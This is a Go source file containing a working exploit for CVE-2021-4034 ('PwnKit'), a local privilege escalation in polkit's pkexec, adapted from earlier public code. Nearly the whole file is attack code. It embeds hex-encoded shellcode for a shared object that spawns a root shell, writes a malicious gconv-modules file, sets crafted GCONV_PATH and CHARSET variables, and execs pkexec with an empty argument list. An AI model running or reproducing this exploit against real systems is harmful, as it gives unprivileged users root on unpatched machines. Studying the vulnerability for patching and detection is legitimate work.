package main

/*
    CVE-2021-4034 - "Pwnkit"
    Original code: clubby789 (https://github.com/clubby789/CVE-2021-4034)
    Adapted by An00bRektn to Golang (because why not?)
    Vulnerability disclosed by Qualys: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034

    About the vulnerability:
        Although polkit had another LPE vulnerability earlier in 2021 (CVE-2021-3560),
        this one explicitly abuses SUID privileges along with an out-of-bounds write
        to spawn a new root shell. Read more in the Qualys blog post.
*/

import (
	"fmt"
	"os"
	"syscall"
)

// in case of emergency, break glass
func check(e error) {
    if e != nil {
        panic(e)
    }
}

func main() {
    // https://saarsec.rocks/2020/05/14/golf.so.html
    evil_so := []byte("\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x28\x80\x04\x08\x00\x00\x00\x00\x3f\x00\x00\x00\x00\x00\x00\x00\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\xeb\x06\x40\x00\x38\x00\x02\x00\x48\xf7\xdb\xeb\x18\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x00\x00\x00\x31\xc0\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x69\xeb\x5a\x00\x00\xd4\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x06\x00\x00\x00\x8f\x00\x00\x00\x00\x00\x00\x00\x8f\x80\x04\x08\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x28\x80\x04\x08\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x57\x48\x31\xff\x0f\x05\xb8\x6a\x00\x00\x00\x0f\x05\x5f\xb8\x3b\x00\x00\x00\x0f\x05")
    evil_mod := []byte("module INTERNAL evil// evil 2\n")
    envp := []string{
        "evildir", 
        "PATH=GCONV_PATH=.", 
        "CHARSET=evil", 
        "SHELL=evil"}

    fmt.Println("[+] Beginning exploit...")
    dir, err := os.MkdirTemp("","pkexec")
    check(err)
    os.Chdir(dir)
    
    // fake executable
    os.Mkdir("GCONV_PATH=.", 0755)
    f, err := os.Create("GCONV_PATH=./evildir") // for some reason, this function just doesn't let you set perms
    check(err)
    f.Close()
    os.Chmod("GCONV_PATH=./evildir",0755)

    // Executing 'evildir' with our PATH variable will point to GCONV_PATH=./evildir
    // This gets written into argv[1], but since argc is 0, it's really just envp[0]
    err = os.Mkdir("evildir", 0755)
    check(err)

    /*
        Quote Qualys: 
            "to print an error message to stderr, 
            pkexec calls the GLib's function g_printerr()"
        This method normally uses UTF-8, but can be passed a new character set
        when CHARSET is not set to UTF-8, which at some point introduces a shared
        library, which we can abuse to introduce our own so. Hence, all of this gconv
        stuff.
    */
    // Setup a malicious gconv-modules which uses GCONV_PATH/evil.so to convert to
    // charset 'evil'
    err = os.WriteFile("evildir/gconv-modules", evil_mod, 0755)
    check(err)

    // Creating the shared object which will pop the shell
    err = os.WriteFile("evildir/evil.so", evil_so, 0755)
    check(err)
    
    syscall.Exec("/usr/bin/pkexec", nil, envp)
}
